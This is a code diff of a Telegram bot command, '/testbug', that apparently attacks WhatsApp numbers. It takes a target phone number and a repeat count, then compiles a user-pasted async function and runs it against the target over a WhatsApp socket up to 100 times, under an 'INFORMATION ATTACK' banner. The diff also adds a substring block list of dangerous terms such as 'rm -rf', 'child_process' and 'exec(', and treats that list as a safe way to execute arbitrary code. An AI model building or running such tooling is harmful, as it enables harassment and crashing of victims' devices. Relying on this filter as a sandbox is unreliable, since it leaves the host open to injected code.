@@ -2765,25 +2765,22 @@ bot.onText(/^\/tes(?:\s+(.+))?$/, async (msg) => {
 
   try {
 
-    const text = msg.text || "";
+    const args = msg.text.trim().split(/\s+/);
 
-    const args = text.split(" ");
-
-    // ===== VALIDASI =====
     if (args.length < 3) {
 
       return bot.sendMessage(
         chatId,
-        "🪧 Example : /testbug 62xxx 10 (reply your function)"
+        "🪧 Example : /testbug 62xxx 10"
       );
 
     }
 
     const q = args[1];
 
-    let jumlah = Math.max(
+    const jumlah = Math.max(
       1,
-      Math.min(parseInt(args[2]) || 1, 1000)
+      Math.min(parseInt(args[2]) || 1, 100)
     );
 
     if (isNaN(jumlah)) {
@@ -2807,7 +2804,7 @@ bot.onText(/^\/tes(?:\s+(.+))?$/, async (msg) => {
 
       return bot.sendMessage(
         chatId,
-        "❌ Reply dengan function"
+        "❌ Reply function"
       );
 
     }
@@ -2816,7 +2813,6 @@ bot.onText(/^\/tes(?:\s+(.+))?$/, async (msg) => {
     const photoUrl =
       "https://gangalink.vercel.app/i/r1468jak.jpg";
 
-    // ===== SEND PROCESS =====
     const processMsg =
       await bot.sendPhoto(
         chatId,
@@ -2826,79 +2822,96 @@ bot.onText(/^\/tes(?:\s+(.+))?$/, async (msg) => {
 `<pre>
 ┏━━━〔 INFORMATION ATTACK 〕━━━┓
 ⟡ Target  :: ${q}
-⟡ Type    :: Unknown Function
-⟡ Status  :: ▓▒░ Processing...
+⟡ Status  :: Processing...
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 </pre>`,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "🔍 Check",
-                  url: `https://wa.me/${q}`
-                }
-              ]
-            ]
-          }
+          parse_mode: "HTML"
         }
       );
 
-    const processMessageId =
-      processMsg.message_id;
-
-    // ===== AMBIL FUNCTION =====
+    // ===== FUNCTION =====
     const funcCode =
       msg.reply_to_message.text;
 
-    const matchFunc =
-      funcCode.match(
-        /async function\s+(\w+)/
-      );
-
-    if (!matchFunc) {
+    // VALIDASI BASIC
+    if (
+      !funcCode.includes(
+        "async function"
+      )
+    ) {
 
       return bot.sendMessage(
         chatId,
-        "❌ Function harus async function"
+        "❌ Function tidak valid"
       );
 
     }
 
-    const funcName =
-      matchFunc[1];
+    // BLOCK CODE BERBAHAYA
+    const blocked = [
+      "process.exit",
+      "exec(",
+      "spawn(",
+      "fork(",
+      "while(true)",
+      "require('fs')",
+      'require("fs")',
+      "delete",
+      "rm -rf",
+      "child_process",
+      "eval(",
+      "Function(",
+      "global.",
+      "process."
+    ];
 
-    // ===== SAFE SOCK =====
-    const safeSock =
-      typeof createSafeSock !==
-      "undefined"
-        ? createSafeSock(
-            global.sock || sock
-          )
-        : (global.sock || sock);
+    for (const x of blocked) {
 
-    // ===== LOAD FUNCTION =====
+      if (funcCode.includes(x)) {
+
+        return bot.sendMessage(
+          chatId,
+          `❌ Function mengandung code terlarang:\n${x}`
+        );
+
+      }
+
+    }
+
+    // ===== SAFE EXECUTE =====
     let fn;
 
     try {
 
-      fn = eval(`
-        (() => {
-          ${funcCode}
-          return ${funcName}
-        })()
-      `);
+      fn = new Function(
+        "sock",
+        "target",
+        "sleep",
+`
+${funcCode}
+
+return typeof test === 'function'
+ ? test
+ : null;
+`
+      )(
+        sock,
+        target,
+        async (ms) =>
+          new Promise(
+            r => setTimeout(r, ms)
+          )
+      );
 
     } catch (e) {
 
       return bot.sendMessage(
         chatId,
-        `❌ FUNCTION ERROR:\n${e.message}`
+        `❌ Compile Error:\n${e.message}`
       );
 
     }
 
-    // ===== VALIDASI FN =====
     if (
       typeof fn !== "function"
     ) {
@@ -2919,98 +2932,49 @@ bot.onText(/^\/tes(?:\s+(.+))?$/, async (msg) => {
 
       try {
 
-        const arity =
-          fn.length;
+        await Promise.race([
 
-        if (arity === 1) {
+          fn(sock, target),
 
-          await fn(target);
+          new Promise(
+            (_, reject) =>
+              setTimeout(
+                () =>
+                  reject(
+                    new Error(
+                      "Timeout"
+                    )
+                  ),
+                10000
+              )
+          )
 
-        } else if (
-          arity === 2
-        ) {
-
-          await fn(
-            safeSock,
-            target
-          );
-
-        } else {
-
-          await fn(
-            safeSock,
-            target,
-            true
-          );
-
-        }
+        ]);
 
       } catch (e) {
 
         console.log(
-          "Loop error:",
+          "EXEC ERROR:",
           e.message
         );
 
       }
 
       await new Promise(
-        r => setTimeout(r, 200)
+        r => setTimeout(r, 300)
       );
 
     }
 
-    // ===== DONE =====
-    const finalText =
-`<pre>
-┏━━━〔 INFORMATION ATTACK 〕━━━┓
-⟡ Target  :: ${q}
-⟡ Type    :: Unknown Function
-⟡ Status  :: √ SUKSES...
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-</pre>`;
-
-    try {
-
-      await bot.editMessageCaption(
-        finalText,
-        {
-          chat_id: chatId,
-          message_id:
-            processMessageId,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                {
-                  text: "🔍 Check",
-                  url: `https://wa.me/${q}`
-                }
-              ]
-            ]
-          }
-        }
-      );
-
-    } catch {
-
-      await bot.sendPhoto(
-        chatId,
-        photoUrl,
-        {
-          caption: finalText,
-          parse_mode: "HTML"
-        }
-      );
-
-    }
+    // ===== SUCCESS =====
+    await bot.sendMessage(
+      chatId,
+      `✅ Success\n⌑ Target: ${q}\n⌑ Amount: ${jumlah}`
+    );
 
   } catch (err) {
 
-    console.error(
-      "ERROR:",
-      err
-    );
+    console.log(err);
 
     bot.sendMessage(
       chatId,
